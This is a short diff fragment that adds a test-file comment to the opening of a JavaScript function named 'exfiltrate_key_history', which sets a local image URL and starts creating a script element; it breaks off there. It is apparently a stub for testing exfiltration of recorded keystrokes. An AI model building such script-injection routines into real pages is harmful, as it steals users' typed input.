@@ -1,3 +1,4 @@
+// exfil_test_remote6.js
 function exfiltrate_key_history() {
   var URL = "./exfil.jpg";
   var script = document.createElement("script");
